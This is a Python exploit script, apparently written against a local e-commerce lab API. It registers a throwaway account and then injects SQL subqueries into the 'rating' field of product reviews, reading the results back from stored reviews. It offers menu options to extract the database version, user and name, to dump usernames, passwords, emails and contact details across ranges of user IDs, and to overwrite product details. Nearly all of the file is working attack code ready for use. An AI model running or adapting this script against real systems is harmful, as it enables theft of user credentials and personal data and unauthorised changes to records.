import subprocess
import requests
import public_ip as ip
import string
import random
import time
from print_color import print

WebsiteIP = "http://127.0.0.1:8081"

def get_random_string(length):
    letters = string.ascii_lowercase
    result_str = ''.join(random.choice(letters) for i in range(length))
    return result_str

generatedid = get_random_string(10).encode('utf-8').decode('utf-8')

logonpayload_json = {
    "username": generatedid,
    "email": f"{generatedid}@gmail.com",
    "contact":"12345678",
    "password":generatedid,
    "profile_pic_url":generatedid
}

def signup():
    result = requests.post(f'{WebsiteIP}/users', headers={'Content-Type': 'application/json'}, json=logonpayload_json)
    return result.json()

response_signup = signup()

userid = response_signup['userid']

def login():
    login_json = {
        "username" : generatedid,
        "password" : generatedid
    }
    result = requests.post(f'{WebsiteIP}/user/login', headers={'Content-Type': 'application/json'}, json=login_json)
    return result.json()

response_login = login()

jwt_token = "Bearer " + response_login['token']


def enum_users(useridtoenum , intensity):

    product = 14
    if intensity == 1:
        payload_json = {
            "userid":userid,
            "rating":f"5, (Select concat('username : ',username,' Password : ',password) from user where userid='{useridtoenum}'),14); -- -"
        }
    elif intensity ==2:
        payload_json = {
            "userid":userid,
            "rating":f"5, (Select concat('userid: ',userid,' username: ',username,' email: ',email,' contact: ',contact,' password: ',password,' type: ',type,' profile_pic_url: ',profile_pic_url,' created_at: ',created_at) from user where userid='{useridtoenum}'),14); -- -"
        }
            
    result = requests.post(f'{WebsiteIP}/product/{product}/review/', headers={'Content-Type': 'application/json','authorization':jwt_token}, json=payload_json)

    return result.json()

def get_all_reviews():

    review = 14
    result = requests.get(f'{WebsiteIP}/product/{review}/reviews', headers={'Content-Type': 'application/json'})

    return result.json()

def find_review_by_id(reviews, target_reviewid):
    for review in reviews:
        if review["reviewid"] == target_reviewid:
            return review
    return None

def enumeration(option):
    product = 14
    if option == 1:
        enum_function = "version()"
    elif option == 2:
        enum_function = "user()"
    elif option == 3:
        enum_function = "database()"

    payload_json = {
        "userid":userid,
        "rating":f"5, (Select {enum_function}),14); -- -"
    }
    result = requests.post(f'{WebsiteIP}/product/{product}/review/', headers={'Content-Type': 'application/json','authorization':jwt_token}, json=payload_json)
    return result.json()

def modify_product(product_id,product_name,product_description,product_categoryid,product_brand,product_price):

    payload_json = {
        "name" : product_name,
        "description": product_description,
        "categoryid": product_categoryid,
        "brand": product_brand,
        "price": product_price
    }

    result = requests.put(f'{WebsiteIP}/product/{product_id}', headers={'Content-Type': 'application/json','authorization':jwt_token}, json=payload_json)
    return result.json()

def get_products():

    result = requests.get(f'{WebsiteIP}/product', headers={'Content-Type': 'application/json','authorization':jwt_token})
    return result.json()

def find_product_by_id(products, product_id):
    for product in products:
        if product['productid'] == product_id:
            return product
    return None

def main():
    ascii_logo()
    while True:
        #bad coding but :< the library im using only allows color printed txt on print() function D:
        print("SP Exploit - By Sora / Jun Yu\n[1] Enumeration\n[2] UserData Exfiltration\n[3] Modifying Product Details\n[4] Exit",tag="Info" , tag_color="cyan",color="white")
        menu_option = int(input(">>> "))
        if menu_option == 1:
            submenu_option = int(input(" -- Enumeration -- \n[1] MYSQL DB Version\n[2] Current User Account\n[3] Current Database\n>>> "))
            result = enumeration(submenu_option)

            try:
                if result['reviewid']:
                    # retrieves array of dictionaries of reviews
                    reviews = get_all_reviews()
                    # loops through using a function to find the review content of the review id generated above
                    found_review = find_review_by_id(reviews, result['reviewid'])
                    if found_review:
                        print(f"Reponse found:\n{found_review['review']}\n" ,tag="Success",tag_color="green" ,color="yellow")
                    else:
                        print(f"No review found with reviewid {result['reviewid']}")
            except:
                continue
        elif menu_option == 2:
            accountlooprange = int(input("Enter range of userid to exfiltrate data: "))
            intensity = int(input("Choose the intensity of the data exfiltration.\n[1] Username - Password\n[2] Userid - Username - email - contact - password - type - profile_pic_url - created_at\n>>> "))
            userdata = ''
            print("Exploiting...\n",tag='Running', tag_color='green', color='white')
            for i in range(accountlooprange):
                result = enum_users(i+1,intensity)
                try:
                    if result['reviewid']:
                        # retrieves array of dictionaries of reviews
                        reviews = get_all_reviews()
                        # loops through using a function to find the review content of the review id generated above
                        found_review = find_review_by_id(reviews, result['reviewid'])
                        if found_review:
                            userdata = userdata + f"{found_review['review']}\n"
                            # print(f"Review found:\n{found_review['review']}")
                        else:
                            print(f"No review found with reviewid {result['reviewid']}")

                except:
                    continue
            print("Exploit Complete! Printing...",tag='Success', tag_color='green', color='white')
            print("-- FORMAT --",tag='Info', tag_color='cyan', color='white')
            if intensity == 1:
                print("USERNAME : <USERNAME> PASSWORD : <PASSWORD>",tag='Info', tag_color='cyan', color='white')
            elif intensity == 2:
                print("Userid - Username - email - contact - password - type - profile_pic_url - created_at",tag='Info', tag_color='cyan', color='white')
            print("----- Table -----", color='purple')
            print(f"{userdata}",color='yellow')
            if userdata == "":
                print("Exploit Failed! - Check Options / Is the target actually vulnerable?",tag='Failure', tag_color='red', color='white')
            else:
                print("Exploit Complete!",tag='Success', tag_color='green', color='white')

                
        elif menu_option == 3:
            product_id = int(input("Enter the Product ID you wish to edit : "))
            product_name = str(input("Enter new Product Name : "))
            product_description = str(input("Enter new Product Description : "))
            product_categoryid = int(input("Enter new Product categoryid : "))
            product_brand = str(input("Enter new Product brand : "))
            product_price = float(input("Enter new Product price : "))
            result = modify_product(product_id,product_name,product_description,product_categoryid,product_brand,product_price)
            try:
                if result['affectedRows'] == 1:
                    print(result,color="yellow",tag_color="green",tag="Success")
            except:
                print(result,color="yellow",tag_color="red",tag="Failure")
            print("Searching for Affected Product...",color="white",tag_color="green",tag="Success")
            products = get_products()
            found_product = find_product_by_id(products, product_id)
            print(f"-- Retrieved info successfully --\nProductid : {found_product['productid']}\nName : {found_product['name']}\nDescription : {found_product['description']}\nCategoryid : {found_product['categoryid']}\nCategoryname : {found_product['categoryname']}\nBrand : {found_product['brand']}\nPrice : {found_product['price']}\nReviewCount : {found_product['reviewcount']}\nImagePath : {found_product['imagepath']}\nRating : {found_product['rating']}\nDiscountID : {found_product['discountid']}\nDiscount Percentage : {found_product['discount_percentage']}",color="yellow",tag_color="green",tag="Success")
        elif menu_option == 4:
            break

def ascii_logo():  
    print("\n")                                                                                                                                        
    print(" SSSSSSSSSSSSSSS PPPPPPPPPPPPPPPPP        XXXXXXX       XXXXXXXPPPPPPPPPPPPPPPPP   lllllll                    iiii          tttt          ",color='cyan')
    print(" SS:::::::::::::::SP::::::::::::::::P       X:::::X       X:::::XP::::::::::::::::P  l:::::l                   i::::i      ttt:::t          ",color='cyan')
    print(" S:::::SSSSSS::::::SP::::::PPPPPP:::::P      X:::::X       X:::::XP::::::PPPPPP:::::P l:::::l                    iiii       t:::::t          ",color='cyan')
    print(" S:::::S     SSSSSSSPP:::::P     P:::::P     X::::::X     X::::::XPP:::::P     P:::::Pl:::::l                               t:::::t          ",color='cyan')
    print(" S:::::S              P::::P     P:::::P     XXX:::::X   X:::::XXX  P::::P     P:::::P l::::l    ooooooooooo   iiiiiiittttttt:::::ttttttt    ",color='cyan')
    print(" S:::::S              P::::P     P:::::P        X:::::X X:::::X     P::::P     P:::::P l::::l  oo:::::::::::oo i:::::it:::::::::::::::::t    ",color='cyan')
    print(" S::::SSSS           P::::PPPPPP:::::P          X:::::X:::::X      P::::PPPPPP:::::P  l::::l o:::::::::::::::o i::::it:::::::::::::::::t    ",color='cyan')
    print(" SS::::::SSSSS      P:::::::::::::PP            X:::::::::X       P:::::::::::::PP   l::::l o:::::ooooo:::::o i::::itttttt:::::::tttttt    ",color='cyan')
    print("     SSS::::::::SS    P::::PPPPPPPPP              X:::::::::X       P::::PPPPPPPPP     l::::l o::::o     o::::o i::::i      t:::::t          ",color='cyan')
    print("     SSSSSS::::S   P::::P                     X:::::X:::::X      P::::P             l::::l o::::o     o::::o i::::i      t:::::t          ",color='cyan')
    print("             S:::::S  P::::P                    X:::::X X:::::X     P::::P             l::::l o::::o     o::::o i::::i      t:::::t         ",color='cyan')
    print("             S:::::S  P::::P                 XXX:::::X   X:::::XXX  P::::P             l::::l o::::o     o::::o i::::i      t:::::t    tttttt",color='cyan')
    print(" SSSSSSS     S:::::SPP::::::PP               X::::::X     X::::::XPP::::::PP          l::::::lo:::::ooooo:::::oi::::::i     t::::::tttt:::::t",color='cyan')
    print(" S::::::SSSSSS:::::SP::::::::P               X:::::X       X:::::XP::::::::P          l::::::lo:::::::::::::::oi::::::i     tt::::::::::::::t",color='cyan')
    print(" S:::::::::::::::SS P::::::::P               X:::::X       X:::::XP::::::::P          l::::::l oo:::::::::::oo i::::::i       tt:::::::::::tt",color='cyan')
    print(" SSSSSSSSSSSSSSS   PPPPPPPPPP               XXXXXXX       XXXXXXXPPPPPPPPPP          llllllll   ooooooooooo   iiiiiiii         ttttttttttt  ",color='cyan')
    print("\n")  


main()
